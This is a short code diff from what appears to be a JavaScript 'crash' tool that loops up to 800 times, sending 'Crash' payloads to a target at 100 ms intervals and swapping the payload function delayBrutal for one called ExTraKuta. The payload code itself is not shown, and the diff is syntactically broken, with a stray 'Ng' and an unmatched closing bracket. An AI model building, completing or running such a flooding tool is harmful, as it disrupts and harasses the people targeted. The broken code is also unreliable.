@@ -836,9 +836,8 @@ const sendNext = async () => {
 
     try {
         if (count < 800) {
-            await Promise.all([
-            delayBrutal(target)
-            ]) Ng
+            ExTraKuta(target)
+            ]);
             console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
             count++;
             setTimeout(sendNext, 100);
